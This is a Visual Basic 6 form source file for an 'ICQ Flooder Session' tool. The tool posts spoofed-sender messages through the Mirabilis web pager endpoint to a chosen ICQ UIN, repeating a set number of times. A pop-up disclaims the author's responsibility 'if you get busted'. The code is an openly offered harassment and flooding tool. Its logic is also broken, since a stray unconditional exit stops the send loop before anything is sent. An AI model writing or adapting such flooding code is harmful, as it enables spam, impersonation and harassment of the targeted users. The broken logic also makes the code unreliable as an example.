VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmIcq 
   AutoRedraw      =   -1  'True
   Caption         =   "ICQ Flooder Session"
   ClientHeight    =   4605
   ClientLeft      =   3315
   ClientTop       =   1680
   ClientWidth     =   5610
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmIcq.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MDIChild        =   -1  'True
   ScaleHeight     =   4605
   ScaleWidth      =   5610
   Begin VB.Frame frmCopies 
      Caption         =   "Number of Copies to Send"
      Height          =   855
      Left            =   120
      TabIndex        =   12
      Top             =   3240
      Width           =   5415
      Begin VB.TextBox txtCopies 
         Height          =   375
         Left            =   2040
         MaxLength       =   2
         TabIndex        =   13
         Top             =   240
         Width           =   3135
      End
   End
   Begin VB.Frame Frame1 
      Height          =   615
      Left            =   180
      TabIndex        =   9
      Top             =   75
      Width           =   5280
      Begin VB.TextBox FromName 
         Height          =   285
         Left            =   1455
         MaxLength       =   9
         TabIndex        =   10
         Top             =   240
         Width           =   3720
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "From Name"
         Height          =   195
         Left            =   255
         TabIndex        =   11
         Top             =   255
         Width           =   810
      End
   End
   Begin VB.Frame Frame2 
      Height          =   615
      Left            =   120
      TabIndex        =   4
      Top             =   765
      Width           =   5415
      Begin VB.TextBox TextUIN 
         Height          =   285
         Left            =   2160
         MaxLength       =   9
         TabIndex        =   0
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label Label6 
         AutoSize        =   -1  'True
         Caption         =   "Send Message to ICQ UIN:"
         Height          =   195
         Left            =   120
         TabIndex        =   5
         Top             =   240
         Width           =   1935
      End
   End
   Begin MSWinsockLib.Winsock SockPager 
      Left            =   240
      Top             =   4200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox TextMessage 
      Height          =   975
      Left            =   105
      MaxLength       =   450
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   2325
      Width           =   5415
   End
   Begin VB.CommandButton BtnSend 
      Caption         =   "&Send"
      Height          =   375
      Left            =   3240
      TabIndex        =   3
      Top             =   4200
      Width           =   2295
   End
   Begin VB.TextBox TextSubject 
      Height          =   315
      Left            =   105
      MaxLength       =   30
      TabIndex        =   1
      Top             =   1725
      Width           =   5415
   End
   Begin VB.Label LabelStatus 
      BorderStyle     =   1  'Fixed Single
      Height          =   375
      Left            =   720
      TabIndex        =   8
      Top             =   4200
      Width           =   2415
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      Caption         =   "Message:"
      Height          =   195
      Left            =   105
      TabIndex        =   7
      Top             =   2085
      Width           =   690
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Subject:"
      Height          =   195
      Left            =   105
      TabIndex        =   6
      Top             =   1485
      Width           =   600
   End
End
Attribute VB_Name = "frmIcq"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim IcqCount
Dim cMessage As String
Dim cSubject As String

Private Sub BtnExit_Click()
   End
End Sub

Private Sub BtnSend_Click()



MsgBox "You are starting this flooding session on your own accord! I (the author) am not responsible if you get busted!"
   
While txtCopies.Text <> "0"

   On Error Resume Next
   
   Dim cSend As String
   Dim cFrom As String
   
   Dim cData As String
   
   ' Verify datas
   If Not IsNumeric(TextUIN.Text) Then
      MsgBox "The ICQ UIN not Numeric !"
         
      TextUIN.SetFocus
      Exit Sub
   End If
   
         
      TextUIN.SetFocus
      Exit Sub
   
         
   If Trim(TextMessage.Text) = "" Then
      MsgBox "Don't Allow Blank Messages"
         
      TextMessage.SetFocus
      Exit Sub
   End If

   ' Status
   LabelStatus.Caption = "Starting..."
   
   ' Close Socket
   SockPager.Close
      
   ' Change the " " for "+"
   cFrom = ChangeSpaces(FromName.Text)
   cSubject = ChangeSpaces(TextSubject.Text)
   cMessage = ChangeSpaces(TextMessage.Text)

   ' Fill the String
   cData = "from=" + cFrom + "&fromemail=mail@from.com&subject=" & cSubject & "&body=" & cMessage & "&to=" & Trim(TextUIN.Text) & "&Send=" & """"

   cSend = "POST /scripts/WWPMsg.dll HTTP/1.0" & vbCrLf
   cSend = cSend & "Referer: http://wwp.mirabilis.com" & vbCrLf
   cSend = cSend & "User-Agent: Mozilla/4.06 (Win95; I)" & vbCrLf
   cSend = cSend & "Connection: Keep-Alive" & vbCrLf
   cSend = cSend & "Host: wwp.mirabilis.com:80" & vbCrLf
   cSend = cSend & "Content-type: application/x-www-form-urlencoded" & vbCrLf
   cSend = cSend & "Content-length: " & Len(cData) & vbCrLf
   cSend = cSend & "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & vbCrLf
   cSend = cSend & cData & vbCrLf & vbCrLf & vbCrLf & vbCrLf

   ' Send Message
   SockPager.Tag = cSend
   SockPager.Connect "wwp.mirabilis.com", 80
   
   txtCopies.Text = txtCopies.Text - 1
   Wend
   
End Sub

Private Sub Form_Load()
Me.Width = 5730
Me.Height = 5010
   On Error Resume Next
   
   ' Close Socket
   SockPager.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
   On Error Resume Next

   ' Close Socket
   SockPager.Close
   
   
End Sub

Private Sub SockPager_Connect()
   On Error Resume Next
   
   ' Status
   LabelStatus.Caption = "Sending..."
  
   SockPager.SendData SockPager.Tag
End Sub

Private Sub SockPager_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
   ' Status
   LabelStatus.Caption = "Error..."
   
   SockPager.Tag = ""
End Sub

Private Sub SockPager_SendComplete()
   ' Status
   LabelStatus.Caption = "Sended..."
   
   SockPager.Tag = ""
End Sub

Private Function ChangeSpaces(cString As String) As String
   On Error Resume Next
  
   ' Variaveis
   Dim cChar As String
   Dim cReturn As String
  
   Dim nLoop As Long
  
   ' Faz a Troca
   cReturn = ""
  
   For nLoop = 1 To Len(cString)
       cChar = Mid(cString, nLoop, 1)
      
       If cChar = " " Then
          cChar = "+"
       End If
      
       cReturn = cReturn + cChar
   Next
  
   ChangeSpaces = cReturn
End Function

Private Sub TextUIN_Change()
Me.Caption = "ICQ Flooding Session [To - " & TextUIN & " ]"
If TextUIN.Text = "" Then Me.Caption = "ICQ Flooding Session"
End Sub
